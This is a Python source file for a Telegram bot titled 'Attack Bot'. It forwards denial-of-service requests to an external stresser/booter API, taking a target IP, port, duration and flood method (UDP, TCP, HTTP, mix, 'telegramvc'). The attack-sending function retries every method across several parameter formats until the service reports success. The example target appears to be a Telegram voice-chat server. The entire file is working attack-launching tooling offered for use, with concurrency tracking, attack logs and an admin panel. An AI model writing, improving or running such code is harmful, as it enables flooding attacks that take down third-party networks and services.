# app.py - Pull All Methods from API
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
import re
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 2

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
        self.total_attacks = 0
        self.concurrent_busy = 0
        self.available_methods = []
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Concurrent busy: {user_attacks}/{MAX_CONCURRENT}"
            if len(self.active_attacks) >= 20:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def log_attack(self, user_id, target, port, duration, method, status, response):
        self.attack_logs.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'response': response[:500],
            'timestamp': datetime.now()
        })
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== FETCH METHODS FROM API =====
async def fetch_available_methods():
    """Fetch available attack methods from API"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    try:
        # Try to get methods from API
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                text = await response.text()
                
                # Try to find methods in the HTML
                methods = []
                
                # Look for method options in HTML
                method_patterns = [
                    r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]+)</option>',
                    r'method["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'value=["\']([^"\']+)["\'][^>]*>.*?(?:UDP|TCP|HTTP|MIX|telegram)',
                ]
                
                for pattern in method_patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            for m in match:
                                if len(m) > 2 and m.lower() not in ['', 'select', 'method', 'none']:
                                    methods.append(m.strip())
                        else:
                            if len(match) > 2 and match.lower() not in ['', 'select', 'method', 'none']:
                                methods.append(match.strip())
                
                # Common methods if none found
                if not methods:
                    methods = [
                        "telegramvc",
                        "udp", 
                        "tcp", 
                        "http", 
                        "mix",
                        "UDP", 
                        "TCP", 
                        "HTTP", 
                        "MIX",
                        "telegram-vc",
                        "telegram",
                        "vc"
                    ]
                
                # Remove duplicates and clean
                methods = list(set([m.strip().lower() for m in methods if m.strip()]))
                
                attack_manager.available_methods = methods
                logger.info(f"✅ Found {len(methods)} methods: {methods}")
                return methods
                
    except Exception as e:
        logger.error(f"Error fetching methods: {e}")
        # Return default methods
        default_methods = ["telegramvc", "udp", "tcp", "http", "mix"]
        attack_manager.available_methods = default_methods
        return default_methods

# ===== SEND ATTACK WITH ALL POSSIBLE METHODS =====
async def send_attack_all_methods(target, port, duration, user_method):
    """
    Try all possible methods to find which one works
    """
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Get available methods
    methods = attack_manager.available_methods or await fetch_available_methods()
    
    # If user specified a method, try it first, then try others
    if user_method and user_method in methods:
        methods_to_try = [user_method] + [m for m in methods if m != user_method]
    else:
        methods_to_try = methods
    
    results = []
    
    # Different parameter formats to try
    param_formats = [
        # Format 1: Simple
        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m},
        # Format 2: With type
        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "type": m},
        # Format 3: With action
        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "action": "start"},
        # Format 4: Website format
        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "network": "normal", "concurrent": "1", "servers": "LAYER 4 #1"},
        # Format 5: Alternative
        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "m": m},
    ]
    
    for method in methods_to_try[:10]:  # Try first 10 methods
        for format_idx, param_func in enumerate(param_formats):
            try:
                params = param_func(method)
                
                timeout = aiohttp.ClientTimeout(total=duration + 15)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    start_time = time.time()
                    
                    # Try GET
                    async with session.get(url, params=params) as response:
                        elapsed = time.time() - start_time
                        result_text = await response.text()
                        
                        # Check if attack was successful
                        is_success = (
                            response.status == 200 and 
                            ("SUCCESS" in result_text or 
                             "sent" in result_text.lower() or
                             "attack" in result_text.lower() or
                             "Host:" in result_text or
                             "Concurrent:" in result_text)
                        )
                        
                        results.append({
                            'method': method,
                            'format': format_idx + 1,
                            'type': 'GET',
                            'params': params,
                            'status': response.status,
                            'elapsed': f"{elapsed:.2f}s",
                            'success': is_success,
                            'response': result_text[:300]
                        })
                        
                        logger.info(f"Method {method} (Format {format_idx+1}): Status {response.status}, Success: {is_success}")
                        
                        if is_success:
                            return {
                                "success": True,
                                "method_used": method,
                                "format_used": format_idx + 1,
                                "params_used": params,
                                "status_code": response.status,
                                "elapsed": f"{elapsed:.2f}s",
                                "response": result_text[:500],
                                "full_response": result_text,
                                "attempts": results
                            }
                        
                        await asyncio.sleep(0.1)
                        
            except Exception as e:
                logger.error(f"Error with method {method}: {e}")
                results.append({
                    'method': method,
                    'format': format_idx + 1,
                    'success': False,
                    'error': str(e)
                })
    
    # If all failed, return last result
    if results:
        return {
            "success": False,
            "method_used": "none",
            "attempts": results,
            "message": f"Tried {len(results)} combinations, all failed"
        }
    
    return {"success": False, "error": "No response from API"}

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    # Fetch methods in background
    if not attack_manager.available_methods:
        asyncio.create_task(fetch_available_methods())
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📡 SHOW METHODS", callback_data="methods")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        f"⚡ *ATTACK BOT - METHOD DETECTION*\n\n"
        f"🔥 Status: ONLINE\n"
        f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📊 Total Attacks: {stats['total']}\n\n"
        f"📌 *How to use:*\n"
        f"`/attack IP PORT TIME METHOD`\n\n"
        f"Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
        f"🤖 *Auto-Detection:*\n"
        f"Bot will try ALL possible methods\n"
        f"and find which one works!\n\n"
        f"Use /methods to see available methods",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available methods"""
    if not attack_manager.available_methods:
        await update.message.reply_text("🔄 Fetching methods from API...")
        methods = await fetch_available_methods()
    else:
        methods = attack_manager.available_methods
    
    text = "📡 *AVAILABLE METHODS*\n\n"
    for i, method in enumerate(methods[:20], 1):
        text += f"{i}. `{method}`\n"
    
    text += f"\n📊 Total: {len(methods)} methods found"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack.")
        return
    
    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME METHOD`\n\n"
            "Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
            "🤖 If method doesn't work, bot will try ALL methods!\n"
            "Use /methods to see available methods",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        method = args[3].lower()
        
        # Validate duration
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        # Check concurrent
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        # Start attack
        status_msg = await update.message.reply_text(
            f"🚀 *ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"🔧 Method: `{method}`\n"
            f"🤖 Auto-trying ALL methods...\n\n"
            f"⏳ Sending attacks...",
            parse_mode='Markdown'
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
        
        # Send attack with all methods
        result = await send_attack_all_methods(target, port, duration, method)
        
        # Log attack
        attack_manager.log_attack(
            user_id, target, port, duration, method,
            "success" if result.get('success') else "failed",
            str(result)
        )
        
        # Build response
        if result.get('success'):
            response_text = (
                f"✅ *ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🔧 Working Method: `{result.get('method_used', 'N/A')}`\n"
                f"📋 Format: `{result.get('format_used', 'N/A')}`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
            )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n\n"
            )
        
        # Add attempts info
        if result.get('attempts'):
            attempts = result['attempts']
            total = len(attempts)
            successful = sum(1 for a in attempts if a.get('success'))
            
            response_text += f"📊 *Tried {total} combinations, {successful} successful*\n\n"
            
            # Show last 5 attempts
            for attempt in attempts[-5:]:
                status = "✅" if attempt.get('success') else "❌"
                method_name = attempt.get('method', 'N/A')
                format_num = attempt.get('format', 'N/A')
                response_text += f"{status} Method: `{method_name}` (Format {format_num})\n"
        
        # Add response preview
        if result.get('response'):
            response_text += f"\n📡 *API Response:*\n```\n{result['response'][:200]}\n```"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack from button"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *ATTACK*\n\n"
        "Send in this format:\n"
        "`IP PORT TIME METHOD`\n\n"
        "Example: `91.108.17.19 32001 60 telegramvc`\n\n"
        "🤖 Bot will try ALL methods automatically!\n"
        "Use /methods to see available methods\n\n"
        "⏱️ Time: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process attack from button"""
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 4:
            await update.message.reply_text(
                "❌ Use: `IP PORT TIME METHOD`\n"
                "Example: `91.108.17.19 32001 60 telegramvc`",
                parse_mode='Markdown'
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        method = parts[3].lower()
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Attacking {target}:{port} with method {method}...\n"
            f"🔄 Trying all methods..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
        result = await send_attack_all_methods(target, port, duration, method)
        
        if result.get('success'):
            response_text = (
                f"✅ *ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🔧 Working Method: `{result.get('method_used', 'N/A')}`\n"
                f"📊 Attack ID: `{attack_id}`\n"
            )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
            )
        
        if result.get('response'):
            response_text += f"\n📡 Response: {result['response'][:200]}"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def methods_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show methods from button"""
    query = update.callback_query
    await query.answer()
    
    if not attack_manager.available_methods:
        await query.edit_message_text("🔄 Fetching methods from API...")
        methods = await fetch_available_methods()
    else:
        methods = attack_manager.available_methods
    
    text = "📡 *AVAILABLE METHODS*\n\n"
    for i, method in enumerate(methods[:20], 1):
        text += f"{i}. `{method}`\n"
    
    text += f"\n📊 Total: {len(methods)} methods found"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    methods_count = len(attack_manager.available_methods) if attack_manager.available_methods else 0
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"📡 Methods Found: {methods_count}\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /methods - View all methods",
        parse_mode='Markdown'
    )

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks(query.from_user.id)
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} ({att['method']}) - {remaining}s left\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: `{query.from_user.id}`\n"
        f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
        f"📌 *Auto-Detection:*\n"
        f"Bot tries ALL methods automatically!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("📡 FETCH METHODS", callback_data="fetch_methods")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="admin_active")],
        [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def fetch_methods_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("🔄 Fetching methods from API...")
    methods = await fetch_available_methods()
    
    text = "✅ *METHODS FETCHED*\n\n"
    for i, method in enumerate(methods[:20], 1):
        text += f"{i}. `{method}`\n"
    
    text += f"\n📊 Total: {len(methods)} methods"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} ({att['method']}) - {remaining}s left\n"
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    methods_count = len(attack_manager.available_methods) if attack_manager.available_methods else 0
    
    await query.edit_message_text(
        f"📈 *BOT STATISTICS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"📡 Methods: {methods_count}\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📡 SHOW METHODS", callback_data="methods")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        f"⚡ *MAIN MENU*\n\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total: {stats['total']}\n"
        f"🌐 Status: ONLINE",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("methods", methods_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(methods_callback, pattern="^methods$"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(fetch_methods_callback, pattern="^fetch_methods$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ ATTACK BOT - METHOD DETECTION")
    print("=" * 50)
    
    # Fetch methods on startup
    asyncio.run(fetch_available_methods())
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)